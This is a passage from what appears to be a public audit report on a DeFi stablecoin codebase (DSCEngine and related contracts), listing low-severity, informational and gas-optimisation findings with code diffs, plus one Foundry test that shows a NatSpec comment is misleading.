There are numerous instances throughout the codebase where spelling errors have been encountered.
## Vulnerability Details
Spelling errors should be strictly avoided. 

Instances:

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L40

       @audit change Algoritmically to Algorithmically
     * - Algoritmically Stable
 

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L210

       @audit change you to your
     * you DSC but keep your collateral in.


https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L220

       @audit change users to user's
     * @param debtToCover The amount of DSC you want to burn to improve the users health factor

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L224

      @audit change incentive to incentivize 
     * @notice A known bug would be if the protocol were 100% or less collateralized, then we wouldn't be able to incentive the liquidators. 


https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L365

         @audit change CL to Chainlink
        // The returned value from CL will be 1000 * 1e8

## Impact
The prevention of spelling errors prevents confusion and also improves readability.
## Tools Used
Manual review and VS Code
## Recommendations
Correct the spelling errors.
## <a id='G-17'></a>G-17. Non Critical Issues：Discrepancy between code and comments

_Submitted by [0xAxe](/profile/clk43mzqn009wmb08j8o79bfh)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L346

## Summary

- The code implementation does not match the description provided in the corresponding comments.

## Vulnerability Details 

- During the auditing process, I noticed this comment: `// ($10e18 * 1e18) / ($2000e8 * 1e10)`. Then, I substituted it into the calculation formula `(usdAmountInWei * PRECISION) / (uint256(price) * ADDITIONAL_FEED_PRECISION)` for computation.
- In the end, I found that the content of this comment is incorrect. It should be `$10e8` instead of `$10e18`. Considering `$2000e8`, it can be inferred that it should be `$10e8`.


## Tools Used

- Manual Review

## Recommendations

- Update the comments to keep them consistent.
```solidity
File src/DSCEngine.sol

- 346        // ($10e18 * 1e18) / ($2000e8 * 1e10)
+ 346        // ($10e8 * 1e18) / ($2000e8 * 1e10)

```

- Reference：[Discrepancy between code and comments](https://github.com/x676f64/secureum-mind_map/blob/master/content/8.%20Audit%20Findings%20201/Discrepancy%20between%20code%20and%20comments.md)
## <a id='G-18'></a>G-18. The nonReentrant modifier should occur before all other modifiers

_Submitted by [0xSmartContract](/profile/clkfyyoms0006jx08k30qx5nb), [ch0bu](/profile/clk3xuwvc0030l80876l7savt), [neocrao](/profile/clkq5kij0000amc083lbapqf7), [mau](/profile/clk9v1fgt0008mn08czddr9to), [owade](/profile/clk9j4mf20002mi08k4758eni), [SolSaver](/profile/clkwer9fs001kjy0849j3go9n). Selected submission by: [mau](/profile/clk9v1fgt0008mn08czddr9to)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L149

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L183

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L229

## Summary

This is a best-practice to protect against reentrancy in other modifiers

## Tools Used

Manual Review


## <a id='G-19'></a>G-19. Underscore function arguments 

_Submitted by [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DecentralizedStableCoin.sol

## Summary
Lack consistency function arguments structure e.g underscores _

## Vulnerability Details
DSCEngine.sol does not use underscore _ e.g _to, _amount function arguments however DecentralizedStableCoin.sol has that format instead

## Impact
Informational: This leads to inconsistency in code affecting code quality 

## Tools Used
Manual Analysis 

## Recommendations
It is recommended to be consistent and prefer _ to all function arguments across all relevant functions of all relevant contracts in project. If underscore not desired then ensure contracts follow same style and do not use them. 
## <a id='G-20'></a>G-20. Better Consistently Named Custom Errors 

_Submitted by [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l). Selected submission by: [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L40

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L41

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L42C5-L42C53

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L54

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L53

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L55

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L56

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L57

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L58

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L59

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L60

## Summary
Custom errors need to be descriptive and follow consistent format in code. This is not the case with the errors in all contracts in scope 

## Vulnerability Details
As dicussed in other finding on Custom Error ambiguity. It is necessary for Custom Errors to be clear about what they specify, mean, are enforcing, checking, requiring or preventing etc. Naming can be more aligned across the Custom Errors used in the contracts. The naming is not consistent and can be improved for clarity

## Impact
Informational: This can lead to confusion for debugging, offchain monitoring, tooling,error analysis and maintainability of code. If Custom Error is not clear it may be misinterpreted incorrectly and may even lead to more errors in code as developers make wrong assumptions about the errors intentions. 

## Tools Used
Manual Analysis

## Recommendations
Following on from above, Custom errors can be named more aligned, shorter and more descriptive and consistent e.g language of ‘Not’ or of ‘Must’ to emphasize what went wrong e.g ‘Must’ , ‘Is’, ‘Not’, ‘Only’ ‘IsOk’ or end with ‘Failed’ etc 
DecentralizedStableCoin.sol
DecentralizedStableCoin__MustBeMoreThanZero() 
DecentralizedStableCoin__MustNotExceedBalance()
DecentralizedStableCoin__MustNotBeZeroAddress();
Or ‘Not’ a requirement format 
DecentralizedStableCoin__NotMoreThanZero() 
DecentralizedStableCoin__NotLessThanBalance()
DecentralizedStableCoin__NotDifferentToZeroAddress();
DSCEngine.sol consistent use of 'Must' language as in below 
DSCEngine__NeedsMoreThanZero() -> DSCEngine__MustBeMoreThanZero()
DSCEngine__TokenAddressesAndPriceFeedAddressesMustBeSameLength()-> DSCEngine_MustBeSameLengthTokenAndPriceFeedAddresses()
DSCEngine__NotAllowedToken() -> DSCEngine__MustBeAllowedToken()
DSCEngine__BreaksHealthFactor(uint256 healthFactor) -> DSCEngine__MustNotBreakHealthFactor(uint256 healthFactor);
DSCEngine__HealthFactorOk() -> DSCEngine__HealthIsFactorOk()
DSCEngine__HealthFactorNotImproved() -> DSCEngine__MustImproveHealthFactor()
Above a just illustrative examples of how to ensure alignment of naming 
## <a id='G-21'></a>G-21. Combine Multiple Mapping Address

_Submitted by [souilos](/profile/clkm7ipa90014l608xim10mt3), [97Sabit](/profile/clk42eeq0007mla08lc11yszp), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [larsson](/profile/clk7vllab0004l708xag2q0in), [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2), [xfu](/profile/clke2oift0000l508j03apihy). Selected submission by: [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L78

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L79

## Summary
Combine multiple address mappings 

## Vulnerability Details
DSCEngine.sol line 78 and 79 
mapping(address user => mapping(address token => uint256 amount)) private s_collateralDeposited;
mapping(address user => uint256 amountDscMinted) private s_DSCMinted;
Above can be combined into single mapping 

## Impact
Gas: Instead of having 2 mappings we can combine into a single mapping of struct for the user addresses data 
We will make use on a single mapping instead of 2 saving the computation, hashing of mapping storage slots computations  and saving storage costs. Also since we have 2 tokens we can also remove the inner mapping ==> mapping(address token => uint256 amount to add separate amounts deposited into user struct 

## Tools Used
Manual Analysis 

## Recommendations
struct User {
    address user;
    uint256 amountWBTCDeposited; 
    uint256 amountWETHDeposited; 
    uint256 amountDSCMinted;
}
mapping(address user => User) userInfo;
## <a id='G-22'></a>G-22. [G-01] - Use `do-while` loop instead of `for-loop` to save users gas cost.

_Submitted by [Bad](/profile/clk49rqar0004mr08jalnmz03), [97Sabit](/profile/clk42eeq0007mla08lc11yszp), [pxng0lin](/profile/clk7366lr002cl5087016oqvc), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [0xsandy](/profile/clk43kus5009imb0830ko7dxy). Selected submission by: [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L118

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L353-L357

## Details

do-while does not check the first condition and prevents the assembly from executing lots of opcodes needed for conditions checks and all these places are right for it because these all always execute the code inside loops on the first condition.

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L118

`Deployment Cost`

| Calculation Type | Before  | After   | Gas Saved |
| :--------------- | :------ | :------ | --------: |
| Avg              | 1004332 | 1004274 |        58 |

```diff
         // For example ETH / USD, BTC / USD, MKR / USD, etc
-        for (uint256 i = 0; i < tokenAddresses.length; i++) {
+        uint256 i;
+
+        do {
             s_priceFeeds[tokenAddresses[i]] = priceFeedAddresses[i];
             s_collateralTokens.push(tokenAddresses[i]);
-        }
+            i++;
+        } while (i < tokenAddresses.length);
+
         i_dsc = DecentralizedStableCoin(dscAddress);
```

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L353-L357

| Calculation Type | Before | After | Gas Saved |
| :--------------- | :----- | :---- | --------: |
| Avg              | 42356  | 42211 |       145 |

```diff
         // the price, to get the USD value
-        for (uint256 i = 0; i < s_collateralTokens.length; i++) {
+        uint256 i;
+        do {
             address token = s_collateralTokens[i];
             uint256 amount = s_collateralDeposited[user][token];
             totalCollateralValueInUsd += getUsdValue(token, amount);
-        }
+            i++;
+        } while (i < s_collateralTokens.length);
+
         return totalCollateralValueInUsd;
```
## <a id='G-23'></a>G-23. Redundant check for transfer success

_Submitted by [sobieski](/profile/clk7551e0001ol408rl4fyi5s)._      
				


## Summary

Inside the `_burnDSC` method, DSCEngine contract checks for success of `transferFrom` call and reverts if it is false:

```solidity
 bool success = i_dsc.transferFrom(dscFrom, address(this), amountDscToBurn);
// This conditional is hypothtically unreachable
if (!success) {
    revert DSCEngine__TransferFailed();
}
```

However, if the `transferFrom` method will not succeed, it will revert. In other case it will always return true. Therefore this check is redundant and can be removed for gas optimization.

## Vulnerability Details

n/a

## Impact

Unnecessary gas consumption

## Tools Used

Manual review

## Recommendations

Remove the success check
## <a id='G-24'></a>G-24. Misleading comment in DSCEngine._healthFactor

_Submitted by [sobieski](/profile/clk7551e0001ol408rl4fyi5s)._      
				


## Summary

The `_healthFactor` method of DSCEngine contract is preceded by the following comment:

```solidity
/*
* Returns how close to liquidation a user is
* If a user goes below 1, then they can get liquidated
*/
function _healthFactor(address user) private view returns (uint256) {
    (uint256 totalDscMinted, uint256 collateralValueInUsd) = _getAccountInformation(user);
    return _calculateHealthFactor(totalDscMinted, collateralValueInUsd);
}
```

The comment implies that the minimal acceptable health factor for the user is equal to 1. This is not true - the `MIN_HEALTH_FACTOR` constant is equal to `1e18`. Therefore this comment is misleading and in contradiction to the actual contract's logic.

## Vulnerability Details

n/a

## Impact

n/a

## Tools Used

Manual review

## Recommendations

Change the value in the comment to `1e18`
## <a id='G-25'></a>G-25. Prefer array assignment over pushing elements in for-loops

_Submitted by [TheSchnilch](/profile/clk89mhkb0002mk080c64z7b8), [0xFEll](/profile/clk8yoz9i0000jy080toixh10), [mahyar](/profile/clkpvim480008l408w11mlv63), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk). Selected submission by: [TheSchnilch](/profile/clk89mhkb0002mk080c64z7b8)._      
				


It is more cost-effective to directly assign `tokenAddresses` to `s_collateralTokens`.

Saving on gas based on the number of elements in `tokenAddresses`: (was measured without gas optimizer)

|          | 1 Element in `tokenAddresses` | 2 Elements in `tokenAddresses` | 3 Elements in `tokenAddresses` |
|----------|----------|----------|----------|
|gas saved|  -178  | 119   |   416   |

If there is only one element in `tokenAddresses`, this method would cost more because using one `.push()` is cheaper than directly assigning the array. But after the first `.push()`, each subsequent `.push()` operation would incur an additional deployment gas cost of 297 gas for each additional element, if the array is not directly assigned. Therefore, even with only two elements, it is more cost-effective to directly assign the array.

Before:
```solidity
File src/DSCEngine.sol
112:    constructor(address[] memory tokenAddresses, address[] memory priceFeedAddresses, address dscAddress) {
113:        // USD Price Feeds
114:        if (tokenAddresses.length != priceFeedAddresses.length) {
115:            revert DSCEngine__TokenAddressesAndPriceFeedAddressesMustBeSameLength();
116:        }
117:        // For example ETH / USD, BTC / USD, MKR / USD, etc
118:        for (uint256 i = 0; i < tokenAddresses.length; i++) {
119:            s_priceFeeds[tokenAddresses[i]] = priceFeedAddresses[i];
120:            s_collateralTokens.push(tokenAddresses[i]); //Pushing each individual element into the array
121:        }
122:        i_dsc = DecentralizedStableCoin(dscAddress);
123:    }
```

After:
```solidity
File src/DSCEngine.sol
112:    constructor(address[] memory tokenAddresses, address[] memory priceFeedAddresses, address dscAddress) {
113:        // USD Price Feeds
114:        if (tokenAddresses.length != priceFeedAddresses.length) {
115:            revert DSCEngine__TokenAddressesAndPriceFeedAddressesMustBeSameLength();
116:        }
117:        // For example ETH / USD, BTC / USD, MKR / USD, etc
118:        for (uint256 i = 0; i < tokenAddresses.length; i++) {
119:            s_priceFeeds[tokenAddresses[i]] = priceFeedAddresses[i];
120:        }
121:        s_collateralTokens = tokenAddresses; //Assign the array directly
122:        i_dsc = DecentralizedStableCoin(dscAddress);
123:    }
```
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L120C1-L120C56
## <a id='G-26'></a>G-26. [I-1] NatSpec `@param` is missing

_Submitted by [0xbug](/profile/clkch5i9j0008jz088olf29x1), [tsar](/profile/clk9isayj0004l30847ln1e8j). Selected submission by: [0xbug](/profile/clkch5i9j0008jz088olf29x1)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol


*Instances (33)*:
```diff
File: https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol

- 112:     constructor(address[] memory tokenAddresses, address[] memory priceFeedAddresses, address dscAddress) {
+ 112: // @param tokenAddresses

- 112:     constructor(address[] memory tokenAddresses, address[] memory priceFeedAddresses, address dscAddress) {
+ 112: // @param priceFeedAddresses

- 112:     constructor(address[] memory tokenAddresses, address[] memory priceFeedAddresses, address dscAddress) {
+ 112: // @param dscAddress

- 212:     function burnDsc(uint256 amount) public moreThanZero(amount) {
+ 212: // @param amount

- 272:     function _burnDsc(uint256 amountDscToBurn, address onBehalfOf, address dscFrom) private {
+ 272: // @param amountDscToBurn

- 272:     function _burnDsc(uint256 amountDscToBurn, address onBehalfOf, address dscFrom) private {
+ 272: // @param onBehalfOf

- 272:     function _burnDsc(uint256 amountDscToBurn, address onBehalfOf, address dscFrom) private {
+ 272: // @param dscFrom

- 282:     function _redeemCollateral(address from, address to, address tokenCollateralAddress, uint256 amountCollateral)
+ 282: // @param from

- 282:     function _redeemCollateral(address from, address to, address tokenCollateralAddress, uint256 amountCollateral)
+ 282: // @param to

- 282:     function _redeemCollateral(address from, address to, address tokenCollateralAddress, uint256 amountCollateral)
+ 282: // @param tokenCollateralAddress

- 282:     function _redeemCollateral(address from, address to, address tokenCollateralAddress, uint256 amountCollateral)
+ 282: // @param amountCollateral

- 297:     function _getAccountInformation(address user)
+ 297: // @param user

- 310:     function _healthFactor(address user) private view returns (uint256) {
+ 310: // @param user

- 317:     function _revertIfHealthFactorIsBroken(address user) internal view {
+ 317: // @param user

- 324:     function _calculateHealthFactor(uint256 totalDscMinted, uint256 collateralValueInUsd)
+ 324: // @param totalDscMinted

- 324:     function _calculateHealthFactor(uint256 totalDscMinted, uint256 collateralValueInUsd)
+ 324: // @param collateralValueInUsd

- 340:     function getTokenAmountFromUsd(address token, uint256 usdAmountInWei) public view returns (uint256) {
+ 340: // @param token

- 340:     function getTokenAmountFromUsd(address token, uint256 usdAmountInWei) public view returns (uint256) {
+ 340: // @param usdAmountInWei

- 350:     function getAccountCollateralValue(address user) public view returns (uint256 totalCollateralValueInUsd) {
+ 350: // @param user

- 361:     function getUsdValue(address token, uint256 amount) public view returns (uint256) {
+ 361: // @param token

- 361:     function getUsdValue(address token, uint256 amount) public view returns (uint256) {
+ 361: // @param amount

- 369:     function getAccountInformation(address user)
+ 369: // @param user

- 385:     function calculateHealthFactor(uint256 totalDscMinted, uint256 collateralValueInUsd)
+ 385: // @param totalDscMinted

- 385:     function calculateHealthFactor(uint256 totalDscMinted, uint256 collateralValueInUsd)
+ 385: // @param collateralValueInUsd

- 393:     function getHealthFactor(address user) external view returns (uint256) {
+ 393: // @param user

- 401:     function getCollateralTokenPriceFeed(address token) external view returns (address) {
+ 401: // @param token

- 417:     function getCollateralBalanceOfUser(address user, address token) external view returns (uint256) {
+ 417: // @param user

- 417:     function getCollateralBalanceOfUser(address user, address token) external view returns (uint256) {
+ 417: // @param token

```

```diff
File: src/DecentralizedStableCoin.sol

- 46:     function burn(uint256 _amount) public override onlyOwner {
+ 46: // @param _amount

- 57:     function mint(address _to, uint256 _amount) external onlyOwner returns (bool) {
+ 57: // @param _to

- 57:     function mint(address _to, uint256 _amount) external onlyOwner returns (bool) {
+ 57: // @param _amount

```

```diff
File: src/libraries/OracleLib.sol

- 21:     function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
+ 21: // @param priceFeed

- 35:     function getTimeout(AggregatorV3Interface /* chainlinkFeed */ ) public pure returns (uint256) {
+ 35: // @param 

```
## <a id='G-27'></a>G-27. NatSpec `@return` argument is missing

_Submitted by [0xbug](/profile/clkch5i9j0008jz088olf29x1), [tsar](/profile/clk9isayj0004l30847ln1e8j), [neocrao](/profile/clkq5kij0000amc083lbapqf7), [SolSaver](/profile/clkwer9fs001kjy0849j3go9n). Selected submission by: [SolSaver](/profile/clkwer9fs001kjy0849j3go9n)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DSCEngine.sol

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DecentralizedStableCoin.sol

## Summary
NatSpec `@return` argument is missing

## Vulnerability Details
*Instances (19)*:
```solidity
File: src/DSCEngine.sol

299:     function _getAccountInformation(address user)

312:     function _healthFactor(address user) private view returns (uint256) {

326:     function _calculateHealthFactor(uint256 totalDscMinted, uint256 collateralValueInUsd)

342:     function getTokenAmountFromUsd(address token, uint256 usdAmountInWei) public view returns (uint256) {

352:     function getAccountCollateralValue(address user) public view returns (uint256 totalCollateralValueInUsd) {

363:     function getUsdValue(address token, uint256 amount) public view returns (uint256) {

373:     function getAccountInformation(address user)

381:     function getAdditionalFeedPrecision() external pure returns (uint256) {

385:     function getPrecision() external pure returns (uint256) {

389:     function calculateHealthFactor(uint256 totalDscMinted, uint256 collateralValueInUsd)

397:     function getHealthFactor(address user) external view returns (uint256) {

401:     function getLiquidationBonus() external pure returns (uint256) {

405:     function getCollateralTokenPriceFeed(address token) external view returns (address) {

409:     function getCollateralTokens() external view returns (address[] memory) {

413:     function getMinHealthFactor() external pure returns (uint256) {

417:     function getLiquidationThreshold() external pure returns (uint256) {

421:     function getCollateralBalanceOfUser(address user, address token) external view returns (uint256) {

425:     function getDsc() external view returns (address) {


```
Link to code - https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DSCEngine.sol

```solidity
File: src/DecentralizedStableCoin.sol

58:     function mint(address _to, uint256 _amount) external onlyOwner returns (bool) {


```
Link to code - https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DecentralizedStableCoin.sol

## Tools Used
Code Review using VSCode

## Recommendations

Add `@return` NatSpec
## <a id='G-28'></a>G-28. [I-4] Constants in comparisons should appear on the left side

_Submitted by [0xbug](/profile/clkch5i9j0008jz088olf29x1), [neocrao](/profile/clkq5kij0000amc083lbapqf7), [mau](/profile/clk9v1fgt0008mn08czddr9to), [SolSaver](/profile/clkwer9fs001kjy0849j3go9n). Selected submission by: [0xbug](/profile/clkch5i9j0008jz088olf29x1)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol

## Summary
Doing so will prevent [typo bugs](https://www.moserware.com/2008/01/constants-on-left-are-better-but-this.html)

## Vulnerability Details

*Instances (4)*:
```solidity
File: src/DSCEngine.sol

96:         if (amount == 0) {

329:         if (totalDscMinted == 0) return type(uint256).max;

```

```solidity
File: src/DecentralizedStableCoin.sol

48:         if (_amount <= 0) { 

61:         if (_amount <= 0) { 

```
## Impact

## Tools Used

## Recommendations
## <a id='G-29'></a>G-29. [I-10] Functions not used internally could be marked external

_Submitted by [0xbug](/profile/clkch5i9j0008jz088olf29x1), [hunterw3b](/profile/clk4rq78j0000l108bpu51153), [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2), [SAQ](/profile/clkftc56x0006le08usdp7epo), [alexzoid](/profile/clk41t0lv006kla08p69ueiel). Selected submission by: [0xbug](/profile/clkch5i9j0008jz088olf29x1)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol

## Summary

## Vulnerability Details

*Instances (3)*:
```solidity
File: src/DecentralizedStableCoin.sol

46:     function burn(uint256 _amount) public override onlyOwner {

```

```solidity
File: src/libraries/OracleLib.sol

21:     function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)

35:     function getTimeout(AggregatorV3Interface /* chainlinkFeed */ ) public pure returns (uint256) {

```
## Impact

## Tools Used

## Recommendations
## <a id='G-30'></a>G-30. Use `assembly` to check for `address(0)`

_Submitted by [0xbug](/profile/clkch5i9j0008jz088olf29x1), [ch0bu](/profile/clk3xuwvc0030l80876l7savt), [neocrao](/profile/clkq5kij0000amc083lbapqf7), [TheSavageTeddy](/profile/clk9nkvfc0000m9080ev2utin), [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2), [SAQ](/profile/clkftc56x0006le08usdp7epo), [0xadarsh](/profile/clkvfe7q8000wl408zqbmb7do), [xfu](/profile/clke2oift0000l508j03apihy), [SolSaver](/profile/clkwer9fs001kjy0849j3go9n). Selected submission by: [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L58

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L103

## Summary
Using `assembly` to check for `address(0)` is gas-efficient. <be>
There are `2` instances of this issue:

```solidity
File: src/DecentralizedStableCoin.sol

58:  if (_to == address(0)) {
```

```solidity
File: src/DSCEngine.sol

103:  if (s_priceFeeds[token] == address(0)) {
```


## <a id='G-31'></a>G-31. Misleading NatSpec for redeemCollateral function

_Submitted by [funkornaut](/profile/clk4161cu0030mb08pybakf1m)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L181

## Summary
This comment on the redeemCollateral function is misleading
`* @notice If you have DSC minted, you will not be able to redeem until you burn your DSC`

## Vulnerability Details
The `redeemCollateral` function does not directly require the user to burn DSC to redeem their collateral. Instead, it checks whether the operation would break the health factor. In cases where a user has a high collateralization ratio, they may redeem some of their collateral without burning DSC while keeping their health factor above the threshold. Therefore, the NatSpec comment may inaccurately represent the `redeemCollateral` functionality under certain conditions.

PoC: Add this test to `DSCEngineTest.t.sol` and it passes 
```
    function testCanRedeemCollateralWithSomeDSCMintedAndNotBurnDSC() public {
        //user deposits a large amout of weth and mints a small amount of dsc
        vm.startPrank(user);
        ERC20Mock(weth).approve(address(dsce), 1000);
        dsce.depositCollateralAndMintDsc(weth, 1000, 1);
        //user redeems some collateral without burning any dsc
        dsce.redeemCollateral(weth, 10);
        vm.stopPrank;
    }
```

## Impact
This comment can lead users and auditors to misunderstand how the function works.

## Tools Used
Manual Review

## Recommendations
Remove the NatSpec line or further clarify that the `redeemCollateral` function may revert if the user has too much DSC minted and will need to burn DSC before calling the function again.
## <a id='G-32'></a>G-32. Use hardcode address instead address(this)

_Submitted by [souilos](/profile/clkm7ipa90014l608xim10mt3), [TheSavageTeddy](/profile/clk9nkvfc0000m9080ev2utin), [SAQ](/profile/clkftc56x0006le08usdp7epo). Selected submission by: [SAQ](/profile/clkftc56x0006le08usdp7epo)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L157

## Summary

## [G-20] Use hardcode address instead address(this)
 
 Instead of using address(this), it is more gas-efficient to pre-calculate and use the hardcoded address. Foundry’s script.sol and solmate’s LibRlp.sol contracts can help achieve this.
References: https://book.getfoundry.sh/reference/forge-std/compute-create-address

```solidity
file: /src/DSCEngine.sol

157        bool success = IERC20(tokenCollateralAddress).transferFrom(msg.sender, address(this), amountCollateral);

```
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L157

## <a id='G-33'></a>G-33. Using `nonReentrant` when it's unnecessary

_Submitted by [Dliteofficial](/profile/clk40ntj2001mmb08zbxnflu4), [iurii2002](/profile/clkjopcpe0020mb08ev4t85e5), [mahyar](/profile/clkpvim480008l408w11mlv63). Selected submission by: [mahyar](/profile/clkpvim480008l408w11mlv63)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L153

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L186

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L197

## Details
In `depositCollateral`, `redeemCollateral`, `mintDsc` and `liquidate` functions you are using `nonReentrant` modifier to prevent reentarny but since the only external call is calling a function on ERC20 tokens there is no way to someone be able to re enter the function, even if attacker some how re enter the function nothing will break since you update the state before sending tokens. 

`nonReentrant` modifier update the state two times, by using this modifier in functions they cost a lots of gas, for being more safe you can only use it with `liquidate` function and remove it from other functions.

```diff
    function depositCollateral(address tokenCollateralAddress, uint256 amountCollateral)
        public
        moreThanZero(amountCollateral)
        isAllowedToken(tokenCollateralAddress)
-       nonReentrant
    {


    function redeemCollateral(address tokenCollateralAddress, uint256 amountCollateral)
        public
        moreThanZero(amountCollateral)
-       nonReentrant
    {


-    function mintDsc(uint256 amountDscToMint) public moreThanZero(amountDscToMint) nonReentrant {
+    function mintDsc(uint256 amountDscToMint) public moreThanZero(amountDscToMint) {
```


## <a id='G-34'></a>G-34. Improve the error being thrown

_Submitted by [0x0115](/profile/clk4scd7q0000l208rpyf7gvh)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L158-L160

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L56

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L276-L278

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L288-L290

## Summary

